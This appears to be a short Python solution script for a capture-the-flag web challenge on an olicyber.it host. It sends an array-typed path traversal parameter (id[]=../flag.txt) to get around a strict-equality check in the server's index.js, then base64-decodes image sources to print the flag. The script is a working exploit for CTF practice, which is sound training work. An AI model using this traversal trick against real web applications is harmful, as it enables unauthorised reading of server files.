import requests
from bs4 import BeautifulSoup
from base64 import b64decode
site = "http://nft.challs.olicyber.it/"
r = requests.get(site + "nft?id[]=../flag.txt") # rompo la riga 21 del index.js dato che c'è ===
zuppetta = BeautifulSoup(r.text, "html.parser")
for i in zuppetta.find_all("img"):
    flag = str(i["src"])[str(i["src"]).find(", ")+2:len(str(i["src"]))].encode()
    print(b64decode(flag).decode(), end="")
    